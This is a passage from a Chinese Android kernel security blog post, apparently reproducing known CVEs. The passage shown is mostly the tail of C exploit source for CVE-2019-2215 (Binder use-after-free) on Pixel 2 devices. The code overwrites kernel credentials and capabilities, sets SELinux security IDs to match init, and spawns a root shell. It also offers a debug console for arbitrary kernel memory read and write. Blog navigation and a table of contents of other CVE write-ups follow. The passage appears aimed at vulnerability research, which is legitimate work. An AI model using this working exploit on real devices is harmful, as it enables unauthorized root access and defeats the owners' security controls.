kwrite_u64(cred_ptr + offsetof(<span class="keyword">struct</span> cred, cap_ambient), ~(u64)<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Also patch our task_security_struct(s?). This is not necessary with</span></span><br><span class="line"><span class="comment">         * SELinux bypassed, but we will again match init&#x27;s settings and set</span></span><br><span class="line"><span class="comment">         * the osid and sid members to 1.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        u64 security_ptr = kread_u64(cred_ptr + offsetof(<span class="keyword">struct</span> cred, security));</span><br><span class="line">        kwrite_u32(security_ptr + offsetof(<span class="keyword">struct</span> task_security_struct, osid), <span class="number">1</span>);</span><br><span class="line">        kwrite_u32(security_ptr + offsetof(<span class="keyword">struct</span> task_security_struct, sid), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* .real_cred == .cred, probably. */</span></span><br><span class="line">        <span class="keyword">if</span> (cred_ptrs[<span class="number">0</span>] == cred_ptrs[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errx(<span class="number">1</span>, <span class="string">&quot;did some patching, but our uid is not 0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, (<span class="type">char</span> *)<span class="literal">NULL</span>) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;launch shell&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_debug_console</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;launching debug console; enter &#x27;help&#x27; for quick help\n&quot;</span>);</span><br><span class="line">    con_loop();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">con_loop</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    u64 kaddr;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> running = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (running) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;debug&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *line = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">size_t</span> getline_buf_len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (getline(&amp;line, &amp;getline_buf_len, <span class="built_in">stdin</span>) == <span class="number">-1</span>)</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;read stdin&quot;</span>);</span><br><span class="line">        <span class="type">int</span> was_handled = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *token = strtok(line, <span class="string">&quot; \t\r\n\a&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token &amp;&amp; !<span class="built_in">strcmp</span>(token, <span class="string">&quot;print&quot;</span>) &amp;&amp; con_consume(&amp;token)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lx kernel_base\n&quot;</span>, kernel_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lx init_task\n&quot;</span>, kernel_base + ksym_init_task);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lx init_user_ns\n&quot;</span>, kernel_base + ksym_init_user_ns);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lx selinux_enabled\n&quot;</span>, kernel_base + ksym_selinux_enabled);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lx selinux_enforcing\n&quot;</span>, kernel_base + ksym_selinux_enforcing);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lx current\n&quot;</span>, current);</span><br><span class="line">            was_handled = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (token &amp;&amp; !<span class="built_in">strcmp</span>(token, <span class="string">&quot;read&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">/* Not that there&#x27;d actually be any kmem allocated there, but if the</span></span><br><span class="line"><span class="comment">             * read address were 0xffffffffffffffff, we&#x27;d technically be able to</span></span><br><span class="line"><span class="comment">             * read exactly one byte. We ~do~ want to handle that case... right?</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (con_parse_hexstring(strtok(<span class="literal">NULL</span>, <span class="string">&quot; \t\r\n\a&quot;</span>), &amp;kaddr) &amp;&amp;</span><br><span class="line">                con_parse_number(strtok(<span class="literal">NULL</span>, <span class="string">&quot; \t\r\n\a&quot;</span>), &amp;len) &amp;&amp;</span><br><span class="line">                con_consume(&amp;token) &amp;&amp; <span class="number">0</span> &lt; len &amp;&amp; len &lt;= PAGE_SIZE &amp;&amp;</span><br><span class="line">                len - <span class="number">1</span> &lt;= ~(u64)<span class="number">0</span> - kaddr) &#123;</span><br><span class="line">                con_kdump(kaddr, len);</span><br><span class="line">                was_handled = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (token &amp;&amp; !<span class="built_in">strcmp</span>(token, <span class="string">&quot;write&quot;</span>)) &#123;</span><br><span class="line">            u8 *data = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> (con_parse_hexstring(strtok(<span class="literal">NULL</span>, <span class="string">&quot; \t\r\n\a&quot;</span>), &amp;kaddr) &amp;&amp;</span><br><span class="line">                con_parse_hexbytes(&amp;token, &amp;data, &amp;len) &amp;&amp; <span class="number">0</span> &lt; len &amp;&amp;</span><br><span class="line">                len &lt;= PAGE_SIZE &amp;&amp; len - <span class="number">1</span> &lt;= ~(u64)<span class="number">0</span> - kaddr) &#123;</span><br><span class="line">                kwrite(kaddr, data, len);</span><br><span class="line">                was_handled = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">free</span>(data);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (token &amp;&amp; !<span class="built_in">strcmp</span>(token, <span class="string">&quot;shell&quot;</span>) &amp;&amp; con_consume(&amp;token)) &#123;</span><br><span class="line">            pid = fork();</span><br><span class="line">            <span class="keyword">if</span> (pid == <span class="number">-1</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">                launch_shell();</span><br><span class="line">            <span class="type">pid_t</span> status;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">            &#125; <span class="keyword">while</span> (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status));</span><br><span class="line">            was_handled = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (token &amp;&amp; !<span class="built_in">strcmp</span>(token, <span class="string">&quot;help&quot;</span>) &amp;&amp; con_consume(&amp;token)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                <span class="string">&quot;quick help\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    print\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        print kernel base address, some kernel symbol offsets,\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        and address of current task_struct as hexstrings\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    read &lt;kaddr&gt; &lt;len&gt;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        read &lt;len&gt; bytes from &lt;kaddr&gt; and display as a hexdump\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        &lt;kaddr&gt; is a hexstring not prefixed with 0x\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        &lt;len&gt; is 1-4096 or 0x1-0x1000\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    write &lt;kaddr&gt; &lt;data&gt;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        write &lt;data&gt; to &lt;kaddr&gt;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        &lt;kaddr&gt; is a hexstring not prefixed with 0x\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        &lt;data&gt; is 1-4096 hexbytes, spaces ignored, to be written *AS-IS*\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        e.g. if kaddr 0xffffffffdeadbeef contains an int, and you want to set\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        its value to 1, enter &#x27;write ffffffffdeadbeef &lt;data&gt;&#x27;, where &lt;data&gt; is\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        &#x27;01000000&#x27;, &#x27;0100 0000&#x27;, &#x27;01 00 0 0 00&#x27;, etc. (our ARM is little-endian)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    shell\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        launch a shell (hint: have we ~somehow~ become another user? :P)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    help\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        print this help\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    exit\n&quot;</span></span><br><span class="line">                <span class="string">&quot;        exit debug console\n&quot;</span>);</span><br><span class="line">            was_handled = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (token &amp;&amp; !<span class="built_in">strcmp</span>(token, <span class="string">&quot;exit&quot;</span>) &amp;&amp; con_consume(&amp;token)) &#123;</span><br><span class="line">            running = <span class="number">0</span>;</span><br><span class="line">            was_handled = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!was_handled)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;woopz; enter &#x27;help&#x27; for quick help\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">free</span>(line);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">con_consume</span><span class="params">(<span class="type">char</span> **token)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*token = strtok(<span class="literal">NULL</span>, <span class="string">&quot; \t\r\n\a&quot;</span>)))</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (*token);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">con_parse_hexstring</span><span class="params">(<span class="type">char</span> *token, u64 *val)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!token || !(*token))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    *val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*token) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*val &amp; <span class="number">0xf000000000000000</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;0&#x27;</span> &lt;= *token &amp;&amp; *token &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">            *val = *val * <span class="number">16</span> + *token - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;a&#x27;</span> &lt;= *token &amp;&amp; *token &lt;= <span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">            *val = *val * <span class="number">16</span> + *token - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;A&#x27;</span> &lt;= *token &amp;&amp; *token &lt;= <span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">            *val = *val * <span class="number">16</span> + *token - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        token++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">con_parse_number</span><span class="params">(<span class="type">char</span> *token, u64 *val)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!token || !(*token))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*token == <span class="string">&#x27;0&#x27;</span> &amp;&amp; (token[<span class="number">1</span>] == <span class="string">&#x27;x&#x27;</span> || token[<span class="number">1</span>] == <span class="string">&#x27;X&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> con_parse_hexstring(token + <span class="number">2</span>, val);</span><br><span class="line">    *val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*token) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*token &lt; <span class="string">&#x27;0&#x27;</span> || <span class="string">&#x27;9&#x27;</span> &lt; *token)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        *val = *val * <span class="number">10</span> + *token - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (*val &gt; PAGE_SIZE)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        token++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">con_parse_hexbytes</span><span class="params">(<span class="type">char</span> **token, u8 **data, <span class="type">size_t</span> *len)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> hexbyte[<span class="number">2</span> + <span class="number">1</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    u8 *buf = <span class="built_in">malloc</span>(PAGE_SIZE * <span class="keyword">sizeof</span>(u8));</span><br><span class="line">    <span class="keyword">if</span> (!buf)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;allocate memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *data = buf;</span><br><span class="line">    *len = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> hexbyte_idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((*token = strtok(<span class="literal">NULL</span>, <span class="string">&quot; \t\r\n\a&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> *c = *token; *c; c++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">isxdigit</span>(*c))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            hexbyte[hexbyte_idx++] = *c;</span><br><span class="line">            <span class="keyword">if</span> (hexbyte_idx == <span class="number">2</span>) &#123;</span><br><span class="line">                hexbyte_idx = <span class="number">0</span>;</span><br><span class="line">                u64 val;</span><br><span class="line">                <span class="keyword">if</span> (*len == PAGE_SIZE || !con_parse_hexstring(hexbyte, &amp;val))</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                buf[(*len)++] = (u8)(val &amp; <span class="number">0xff</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *len &amp;&amp; !hexbyte_idx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">con_kdump</span><span class="params">(u64 kaddr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="comment">/* Mimic the output of `xxd`. */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> line[<span class="number">40</span> + <span class="number">1</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> text[<span class="number">16</span> + <span class="number">1</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!len)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    u8 *buf = <span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(u8));</span><br><span class="line">    <span class="keyword">if</span> (!buf)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;allocate memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">    kread(kaddr, buf, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (u64 line_offset = <span class="number">0</span>; line_offset &lt; len; line_offset += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="type">char</span> *linep = line;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + line_offset &lt; len) &#123;</span><br><span class="line">                <span class="type">char</span> c = buf[i + line_offset];</span><br><span class="line">                linep += <span class="built_in">sprintf</span>(linep, (i &amp; <span class="number">1</span>) ? <span class="string">&quot;%02x &quot;</span> : <span class="string">&quot;%02x&quot;</span>, c);</span><br><span class="line">                text[i] = (<span class="string">&#x27; &#x27;</span> &lt;= c &amp;&amp; c &lt;= <span class="string">&#x27;~&#x27;</span>) ? c : <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                linep += <span class="built_in">sprintf</span>(linep, (i &amp; <span class="number">1</span>) ? <span class="string">&quot;   &quot;</span> : <span class="string">&quot;  &quot;</span>);</span><br><span class="line">                text[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%016lx: %s %s\n&quot;</span>, kaddr + line_offset, line, text);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Excuse this mess; bionic libc doesn&#x27;t have on_exit(). */</span></span><br><span class="line"><span class="type">char</span> *stage_desc;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stage_t</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">char</span> *desc;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stage_t</span> <span class="title">stages</span>[] =</span> &#123;</span><br><span class="line">    &#123;prepare_globals, <span class="string">&quot;startup&quot;</span>&#125;,</span><br><span class="line">    &#123;find_current, <span class="string">&quot;find kernel address of current task_struct&quot;</span>&#125;,</span><br><span class="line">    &#123;obtain_kernel_rw, <span class="string">&quot;obtain arbitrary kernel memory R/W&quot;</span>&#125;,</span><br><span class="line">    &#123;find_kernel_base, <span class="string">&quot;find kernel base address&quot;</span>&#125;,</span><br><span class="line">    &#123;patch_creds, <span class="string">&quot;bypass SELinux and patch current credentials&quot;</span>&#125;,</span><br><span class="line">    &#123;launch_shell, <span class="literal">NULL</span>&#125;,</span><br><span class="line">    &#123;launch_debug_console, <span class="literal">NULL</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_stage</span><span class="params">(<span class="type">int</span> stage_idx)</span> &#123;</span><br><span class="line">    stage_desc = stages[stage_idx].desc;</span><br><span class="line">    (*stages[stage_idx].func)();</span><br><span class="line">    <span class="keyword">if</span> (stage_desc &amp;&amp; pid &amp;&amp; (stage_idx != <span class="number">3</span> || kernel_base))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] %s\n&quot;</span>, stage_desc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notify_stage_failure</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stage_desc &amp;&amp; pid)</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] %s failed\n&quot;</span>, stage_desc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    atexit(notify_stage_failure);</span><br><span class="line">    debugging = argc == <span class="number">2</span> &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;debug&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execute_stage(<span class="number">0</span>); <span class="comment">/* prepare_globals() */</span></span><br><span class="line">    execute_stage(<span class="number">1</span>); <span class="comment">/* find_current() */</span></span><br><span class="line">    execute_stage(<span class="number">2</span>); <span class="comment">/* obtain_kernel_rw() */</span></span><br><span class="line">    execute_stage(<span class="number">3</span>); <span class="comment">/* find_kernel_base() */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (debugging) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!kernel_base) &#123;</span><br><span class="line">            notify_stage_failure();</span><br><span class="line">            warnx(<span class="string">&quot;printed kernel offsets won&#x27;t be reliable\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        execute_stage(<span class="number">6</span>); <span class="comment">/* launch_debug_console() */</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        execute_stage(<span class="number">4</span>); <span class="comment">/* patch_creds() */</span></span><br><span class="line">        execute_stage(<span class="number">5</span>); <span class="comment">/* launch_shell() */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212112523545.png"
                      alt="image-20241212112523545"
                ></p>
<h1 id="Syzkaller-For-Android-Kernel"><a href="#Syzkaller-For-Android-Kernel" class="headerlink" title="Syzkaller For Android Kernel"></a>Syzkaller For Android Kernel</h1><p>please goto 《Syzkaller源码分析及利用》…….</p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Android安全-内核篇</li>
        <li><strong>Author:</strong> 韩乔落</li>
        <li><strong>Created at
                :</strong> 2024-10-22 15:21:46</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-12-24 15:42:49
            </li>
        
        <li>
            <strong>Link:</strong> https://jelasin.github.io/2024/10/22/Android安全-内核篇/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/AOSP/">#AOSP</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%BA%94%E7%94%A8%E7%AF%87/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Android安全-应用篇</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/10/21/Android%E5%AE%89%E5%85%A8-%E5%BC%80%E5%8F%91%E7%AF%87/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Android安全-开发篇</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'jelasin/jelasin.github.io',
                'data-repo-id': 'R_kgDOKVydDA',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'not-lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Android安全-内核篇</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-%E5%A4%8D%E7%8E%B0"><span class="nav-text">CVE 复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2023-21400-Double-Free-DirtyPTE"><span class="nav-text">CVE-2023-21400 - Double Free | DirtyPTE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="nav-text">触发漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95"><span class="nav-text">尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E6%80%A7"><span class="nav-text">可利用性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-28350-file-UAF-DirtyPTE"><span class="nav-text">CVE-2022-28350 - file UAF | DirtyPTE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-UAF%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">file UAF现有利用方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%8F%E9%A1%B5%E8%A1%A8%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8file-UAF"><span class="nav-text">脏页表方法利用file UAF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-29661-pid-UAF-DirtyPTE"><span class="nav-text">CVE-2020-29661 - pid UAF |  DirtyPTE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%8F%E9%A1%B5%E8%A1%A8%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8CVE-2020-29661"><span class="nav-text">脏页表方法利用CVE-2020-29661</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2019-2215-Binder-UAF"><span class="nav-text">CVE-2019-2215 - Binder UAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit"><span class="nav-text">exploit</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Syzkaller-For-Android-Kernel"><span class="nav-text">Syzkaller For Android Kernel</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
